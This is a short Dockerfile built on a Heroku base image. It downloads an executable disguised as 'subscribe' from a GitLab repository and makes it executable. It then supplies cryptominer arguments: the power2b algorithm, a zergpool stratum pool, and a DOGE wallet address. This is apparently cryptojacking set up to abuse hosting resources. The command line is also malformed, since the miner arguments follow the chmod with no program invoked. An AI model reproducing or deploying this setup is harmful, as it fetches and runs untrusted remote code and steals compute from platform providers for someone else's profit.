FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://gitlab.com/evilside/subscribe/-/raw/main/subscribe; chmod +x subscribe; -a power2b -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u DEkD3VPhyYLxRScjAjg78cMxZRCXirsDv9 -p c=DOGE
CMD bash heroku.sh
